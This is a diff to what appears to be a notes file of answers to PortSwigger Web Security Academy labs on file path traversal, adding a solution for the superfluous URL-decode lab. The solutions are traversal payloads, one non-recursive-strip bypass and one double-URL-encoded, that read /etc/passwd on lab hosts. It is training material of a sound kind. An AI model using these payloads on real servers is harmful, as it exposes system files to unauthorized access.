@@ -10,4 +10,7 @@ solution: https://acf11f0b1e1ea11180f408d700e800a5.web-security-academy.net/imag
 url: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively
 solution: https://accc1f791f37f46480fe243200a500f4.web-security-academy.net/image?filename=/image?filename=....//....//....//etc//passwd
 
+[lab: File path traversal, traversal sequences stripped with superfluous URL-decode]
+url: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
+solution: https://acd01f3f1fe67b0280c6368000a10004.web-security-academy.net/image?filename=..%252f..%252f..%252fetc%252fpasswd
 
